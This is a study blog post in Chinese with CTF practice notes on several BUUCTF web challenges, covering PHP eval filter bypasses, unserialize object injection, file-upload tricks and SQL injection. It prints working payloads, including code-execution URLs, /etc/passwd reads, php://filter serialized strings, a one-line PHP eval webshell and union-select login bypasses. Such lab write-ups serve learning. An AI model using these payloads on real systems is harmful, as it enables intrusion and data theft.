---
title: buuctf4月27日
date: 2024-4-27 20:59:49
tags: [buuctf, ctf]
categories: 刷题笔记
---

## [RoarCTF 2019]Easy Calc

### ![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/8d7e93faf78343328ec17a90191c6c8b.png#pic_center)

页面发现什么也没有F12发现有calc.php这个文件，进去发现有源码

<?php 
error_reporting(0); 
if(!isset($_GET['num'])){   
	show_source(__FILE__); 
}else{     
	$str = $_GET['num'];     
	$blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];     
	foreach ($blacklist as $blackitem) {         
		if (preg_match('/' . $blackitem . '/m', $str)) {             
			die("what are you want to do?");         
		}     
	}     
	eval('echo '.$str.';'); 
} 
?> 
写num=system('ls');发现不允许，首页面有一个提示是有waf保护，

可能是不能写参数

### 知识点1：空格绕过 waf

在 num 参数前加上一个空格，即：node4.buuoj.cn:29780/calc.php? num=system('ls');

返回结果：

这样服务器会认为传入的参数是 空格num ，而不是 num 。这里用到这种绕过方式是因为假定服务器只对 num 参数做检测，而对于其他参数不做检测。

当 空格num 参数传入到后端，被 PHP 代码处理时，会被去除多余空格及特殊字符：如空格、制表符、回车换行符以及某些特殊字符等。这样一来仍然是 num 参数了。

#### payload:calc.php? num=var_dump(scandir(current(localeconv())));

查看当前目录下的文件
localeconv() 函数返回当前设置的地区的格式化信息，包括货币符号、小数点符号等。它返回一个数组，其中包含了与当前地区相关的格式化参数，该函数返回的第一个元素的值通常是小数点 “.” 。
current() 函数用于获取数组中的当前元素的值。在这里，它用于获取 localeconv() 函数返回的数组的第一个元素的值，即一个小数点。
scandir() 函数用于获取指定目录中的文件和文件夹列表。它接受一个路径作为参数，并返回一个包含指定目录中所有文件和文件夹的数组。scandir(".") 表示获取当前目录下的文件列表。
最后使用 var_dump() 函数将该列表输出到页面上。



但其实这里可以更简单：

#### calc.php? num=var_dump(scandir(chr(46)));

46 是 “.” 的 ASCII 码值，返回结果：



因为可以有参数嘛。用 chr() 函数将数字变为字符。

#### 同理查看根目录下的文件：calc.php? num=var_dump(scandir(chr(47)));

47 是 “/” 的 ASCII 码值

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/50e93170372c4fbf9e09ad41d6f5909d.png#pic_center)

找到/f1aag这个文件

查看 /f1agg 文件

#### num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));

### 知识点2.file_get_contents() 函数

把整个文件读入一个字符串中。

chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)

分别是 ‘/’ ‘f’ ‘1’ ‘a’ ‘g’ ‘g’ 的 ASCII 值转字符，‘.’ 用作字符串连接。每一个 chr() 函数返回的结果由于是字符，所以自带了一对引号，不需要额外再加。

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/7aacafeccdf94541a6b70abbb639c728.png#pic_center)

### 知识点3.url溢出

? num=1;eval(end(pos(get_defined_vars())))&nss=phpinfo();&

get_defined_vars()：返回由所有已定义变量所组成的数组，会返回 _GET , _POST , _COOKIE , _FILES 全局变量的值，返回数组顺序为 get->post->cookie->files 。

current()：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回 $_GET 变量的数组值。

end() : 将内部指针指向数组中的最后一个元素，并输出。即新加入的参数 nss 。

最后由 eval() 函数执行，使得 get 方式的参数 nss 生效。

这样的话就可以再利用 nss 传参了，由于代码只对 num 参数的值做了过滤，因此 nss 参数理论上可以造成任意代码执行。

这样可以看到phpinfo，找到disable_function函数

#### 查看 /etc/passwd 文件

```
? num=1;eval(end(pos(get_defined_vars())))&nss=include("/etc/passwd");
```

输出结果：

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/3e1382cdd0e14e2ab9a8582e68920b4f.png#pic_center)

### 知识点4.http请求走私

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/da31f71647244b56aad12e09678180b5.png#pic_center)

大致原理就是使用了两个 Content-Length 头，使得前端无法识别，直接将整个包完全发给了后端。但这样还是要接受后端的黑名单过滤，所以 num 传参还是不能为所欲为。

## [HCTF 2018]admin 1

**第一种解法：密码爆破-尝试弱口令**

[BUUCTF-[HCTF 2018\]admin1_[hctf 2018]admin 1-CSDN博客](https://blog.csdn.net/qq_46918279/article/details/121294915)

三种方法不太理解。

## [ZJCTF 2019]NiZhuanSiWei

### ![image-20240426180112007](C:\Users\86182\assets\image-20240426180112007.png)

#### 1.先要把“welcome to the zjctf”从$text中读出来

?text=data://text/plain,welcome to the zjctf

2.$file不能是含有flag,有一个文件include()函数可以先写php伪协议读一下，（因为password还不知道要干嘛，password有unserialize(),可以初步判断是反序列化，直接输出，可以看出是__tostring函数这个魔术方法（将这个对象当成字符串输出））

3.<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?> useless.php里的文件内容，可以发现是一个对象，可以用password=*O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}* 

绕过

最后的payload:

```php
?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
1
```

## [MRCTF2020]Ez_bypass

![image-20240426182327414](C:\Users\86182\assets\image-20240426182327414.png)

I put something in F12 for you
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else{
                echo 'You can not get it !';
            }

        }
        else{
            die('only one way to get the flag');
        }
}
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}
}Please input first
三个参数：gg&&id&&passwd,第一二个是数组绕过（因为是强相等）

passwd是弱比较（1234567qhwjhiquwf）获得flag



## [网鼎杯 2020 青龙组]AreUSerialz

在反序列化的过程中，调用__destruct析构方法

```
function  __destruct() {  
if($this->op === "2")   
$this->op = "1";  
$this->content = "";
$this->process();}
```

```
public  function` `process() {
  if($this->op == "1") {
    $this->write();
  } else if($this->op == "2") {
    $res= $this->read();
    $this->output($res);
  } else{
    $this->output("Bad Hacker!");
  }
}
```

查看代码可以看出来，GET方式传入序列化的str字符串，str字符串中每一个字符的ASCII范围在32到125之间，然后对其反序列化。

如果op==="2"，将其赋为"1"，同时content赋为空，进入process函数，需要注意到的地方是，这里op与"2"比较的时候是强类型比较

进入process函数后，如果op=="1"，则进入write函数，若op=="2"，则进入read函数，否则输出报错，可以看出来这里op与字符串的比较变成了弱类型比较==。

所以我们只要令op=2,这里的2是整数int。当op=2时，op==="2"为false，op=="2"为true，接着进入read函数

整个利用思路就很明显了，还有一个需要注意的地方是，$op,$filename,$content三个变量权限都是protected，而

#### protected权限的变量在序列化的时会有%00*%00字符，

%00字符的ASCII码为0，就无法通过上面的is_valid函数校验。

![img](https://img2020.cnblogs.com/blog/1828215/202005/1828215-20200512095733036-1748012487.png)

在这里有几种绕过的方式，简单的一种是：php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可

paylaod:?str=O:11:%22FileHandler%22:3:{s:2:%22op%22;i:2;s:8:%22filename%22;s:57:%22php://filter/read=convert.base64-encode/resource=flag.php%22;s:7:%22content%22;N;}

 比赛的时候还有相对路径和绝对路径的问题，需要拿到绝对路径才能读取flag

可以先尝试读取/etc/passwd检验自己的payload是否正确，然后再读取服务器上的配置文件，猜出flag.php所在的绝对路径，再将其读取。

```
http:``//82f3c803-c285-4d4c-846c-59d240b730e0.node3.buuoj.cn/?str=O:11:%22FileHandler%22:3:{s:2:%22op%22;i:2;s:8:%22filename%22;s:60:%22php://filter/read=convert.base64-encode/resource=/etc/passwd%22;s:7:%22content%22;N;}
```

　　下面这个payload是比赛的时候用的，buuoj上环境路径不一样。

```
http:``//82f3c803-c285-4d4c-846c-59d240b730e0.node3.buuoj.cn/?str=O:11:%22FileHandler%22:3:{s:2:%22op%22;i:2;s:8:%22filename%22;s:67:%22php://filter/read=convert.base64-encode/resource=/web/html/flag.php%22;s:7:%22content%22;N;}
```

## [GXYCTF2019]BabyUpload

### ![image-20240426201402591](C:\Users\86182\assets\image-20240426201402591.png)

1.![](https://img-blog.csdnimg.cn/2021070719261872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNzAyOTgx,size_16,color_FFFFFF,t_70)

2.先写一下.htaccess和user.ini两个配置文件，会发现

![image-20240426202003132](C:\Users\86182\assets\image-20240426202003132.png)

所以要改一下，SetHandler application/x-httpd-php这样写

#### 3.要改Content-Type:image/jpeg是图片的样式，application/octet-stream是php样式。

4.过滤<?可以用JS辅助写一句话木马

<script language="php">@eval($_POST[aaa]);</script>

蚁剑连接查看。

## BUUCTF [GXYCTF2019]BabySQli 1

![image.png](https://img-blog.csdnimg.cn/img_convert/6a38d3e45f32eceef1727c3a2b07aea9.png)



burp抓包：初看应该是sql注入

![image.png](https://img-blog.csdnimg.cn/img_convert/87b8cc9d7c33f114c34c155c5bfe169c.png)

找到隐藏信息，双重加密，base32解码后再base64解码，

得到 select * from user where username = '$name'

找到注入点，可以知道$name是参数，并且就是第一个输入的值

万能钥匙不能直接进去，换成0‘ ||TRUE#不能用（显示密码错误） 换个角度，联合注入1’‘ unoin select 1,2#发现报错列数错了加一个1’‘ unoin select 1,2,3#显示wrong user一个一个试将那个$name=数组的那个

发现是第二个

![image.png](https://img-blog.csdnimg.cn/img_convert/7b865fe304a063e64dceb70d90e59afb.png)

找到

if($arr[1] == "admin")

{ 		if(md5($password) == $arr[2])

​                   { 			echo $flag; 		} 		

​             else{ 			die("wrong pass!"); 		} 	}

换种方式猜测
username数据表里面的3个字段分别是flag、name、password。
猜测只有password字段位NULL
咱们给参数password传入的值是123
那么传进去后，后台就会把123进行md5值加密并存放到password字段当中
当我们使用查询语句的时候
我们pw参数的值会被md5值进行加密
然后再去与之前存入password中的md5值进行比较
如果相同就会输出flag

爆flag：

这里pw参数的值为123456
可以随便传
但是要对传入的那个值进行md5值加密
网上可以随便找一个在线md5加密平台

1’union select 1,‘admin’,‘e10adc3949ba59abbe56e057f20f883e’#
123456
       [GYCTF2020]Blacklist 1

![image-20240426210530825](C:\Users\86182\assets\image-20240426210530825.png)

注入点尝试1’出错了就是‘

union select发现正则匹配select被过滤，直接双写看看可以不可以，发现不可以

### 知识点：Handler语法

handler语句，一行一行的浏览一个表中的数据

handler语句并不具备select语句的所有功能。

mysql专用的语句，并没有包含到SQL标准中。
HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。

1、HANDLER tbl_name OPEN

打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。

2、HANDLER tbl_name READ FIRST

获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。

3、HANDLER tbl_name CLOSE

关闭打开的句柄。

4、HANDLER tbl_name READ index_name = value

通过索引列指定一个值，可以指定从哪一行开始,通过NEXT继续浏览。
